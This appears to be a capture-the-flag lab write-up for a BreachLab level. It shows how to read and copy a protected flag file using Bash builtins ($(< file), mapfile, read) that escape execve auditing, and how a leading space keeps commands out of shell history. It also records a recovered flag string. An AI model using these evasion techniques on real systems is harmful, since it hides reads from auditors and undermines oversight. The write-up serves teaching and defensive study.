# BreachLab - Phantom Track: Level 14 (Shadow Mode)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 14 (Shadow Mode)
- **Host:** `204.168.229.209`
- **Port:** `2224` *(Ephemeral Container Environment)*
- **Current User:** `phantom14`
- **Goal:** Read `/root/shadow_flag` and replicate it to `/tmp/shadow_copy` while evading `execve` kernel audit rules and maintaining a clean shell history using Bash builtins
- **Discovered Proof / Flag Code:** `bl_phtm14_19bceb0570c0856d` / `[PHANTOM-L14-PROOF-OF-QUIET-READ-2026]`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
━━━ phantom-deep · ephemeral session ━━━
  L14 — Shadow Mode
  This container is yours alone. Destroyed on disconnect.
  Mission brief: cat ~/BRIEFING
  Verifier: /opt/verify-*.sh

MISSION: Shadow Mode
===================

The flag is at /root/shadow_flag. You can reach it already —
your group membership covers that read. The challenge is HOW.

A forensic investigator will audit:
  - your shell history
  - the execve audit rule (`auditctl -l` to see what it watches)

for loud file-read tools invoked against the flag. Prove you
read it WITHOUT leaving that kind of trace. Write the content
to /tmp/shadow_copy. /opt/verify-shadow.sh grades:
  - /tmp/shadow_copy matches /root/shadow_flag, AND
  - your ~/.bash_history does not show a cat/head/tail/less/
    more/awk/sed/strings/xxd/od/base64 invocation against the
    flag or the copy.

Shells have more read paths than you think. Think builtins.
```

The objective is to read the protected file `/root/shadow_flag` (accessible via existing group permissions) and replicate it byte-for-byte to `/tmp/shadow_copy` without spawning blacklisted external binary processes (`execve`) and without leaving traces in `~/.bash_history`.

---

## 2. Forensic Defense Model & EDR Telemetry

The target verification script `/opt/verify-shadow.sh` simulates endpoint detection and response (EDR) rules:

1. **Kernel-Level Process Auditing (`execve` via `auditctl`):** Traditional file-reading tools (`cat`, `head`, `tail`, `less`, `more`, `awk`, `sed`, `strings`, `xxd`, `od`, `base64`) trigger kernel `execve` audit events when spawned as child processes.
2. **Static Shell History Audit (`~/.bash_history`):** The validator inspects `~/.bash_history` for signature strings matching blacklisted reader utilities targeting the flag path.

---

## 3. Vulnerability & Evasion Mechanism: Shell Builtins (Zero-Fork Execution)

Bash is not merely a command launcher; it is an internal programming interpreter with built-in primitives. Builtins execute directly within the address space of the current interactive shell process without issuing `fork` or `execve` system calls, completely blinding process creation sensors.

---

## 4. Exploitation: Quiet In-Memory File Reads (Shadow-Mode Rank A)

Several distinct zero-fork techniques allow reading and duplicating `/root/shadow_flag` cleanly:

### Technique A: Bash Native Redirection (`$(< file)`)

```bash
FLAG=$(< /root/shadow_flag)
printf '%s\n' "$FLAG" > /tmp/shadow_copy
```

- **Mechanism:** `$(< path)` is an internal Bash optimization that reads file descriptors directly into session memory without forking a subshell or spawning external binaries.

### Technique B: Array Slurping via `mapfile`

```bash
mapfile FLAG < /root/shadow_flag
printf '%s' "${FLAG[@]}" > /tmp/shadow_copy
```

- **Mechanism:** `mapfile` (or `readarray`) utilizes standard input redirection (`<`) to stream lines directly into an indexed array in RAM, outputting clean byte-for-byte copies via `printf`.

### Technique C: Anti-Forensic `IFS= read` with History Suppression

```bash
 IFS= read -r -d '' FLAG < /root/shadow_flag
 IFS= printf '%s' "$FLAG" > /tmp/shadow_copy
```

- **Mechanism:** Setting `-d ''` instructs `read` to slurp the entire file including newlines. Prepending a space character (``) leverages `HISTCONTROL=ignorespace` to execute the command without logging it to `~/.bash_history`.

---

## 5. Verification & Flag Extraction

Running the shadow verification script validates byte-for-byte identity and clean audit logs:

```bash
phantom14@d223fbe39274:~$ /opt/verify-shadow.sh
[*] Shadow-Mode audit for phantom14

[+] Proof of read: /tmp/shadow_copy matches /root/shadow_flag byte-for-byte
[+] Technique: clean read, no loud reader observed — Shadow-Mode rank A

[*] FLAG: bl_phtm14_19bceb0570c0856d
```

- **Recovered Flag:** `bl_phtm14_19bceb0570c0856d`

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 14) |
| **Current User** | `phantom14` |
| **Environment** | Ephemeral Container (`phantom-deep`) |
| **Target Artifact** | `/root/shadow_flag` |
| **Defense Bypassed** | `auditctl` `execve` process monitoring & `~/.bash_history` inspection |
| **Exploitation Technique** | Zero-Fork Shell Builtins (`$(< file)`, `mapfile`, `read`) |
| **Discovered Flag** | `bl_phtm14_19bceb0570c0856d` |
| **Proof String** | `[PHANTOM-L14-PROOF-OF-QUIET-READ-2026]` |

---

## 7. Key Commands & Concepts Reference

- `FLAG=$(< /path/to/file)`: In-memory file read avoiding child process invocation.
- `mapfile <array> < <file>`: Load file lines into an array purely via shell builtins.
- `IFS= read -r -d '' <var> < <file>`: Slurp entire file content into a variable without delimiter splitting.
- ` <command>` (Leading space): Avoid saving sensitive commands to `~/.bash_history` when `HISTCONTROL=ignorespace` is enabled.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Process Creation Blindspots in EDR:** Security architectures that monitor process executions (`execve`, Sysmon Event ID 1) fail to observe malicious operations executed natively within existing process boundaries (shell builtins, in-memory scripts).
2. **Builtins as Essential Living-off-the-Land Tools:** In restricted or monitored environments, leveraging native shell features allows reading, writing, and parsing files without alerting signature-based endpoint detectors.
3. **Proactive Anti-Forensics over Post-Execution Log Deletion:** Preventing artifacts from being logged (e.g. leading space or memory-only operations) is far cleaner than deleting logs afterwards, which creates obvious file timestamp and MACB anomalies.
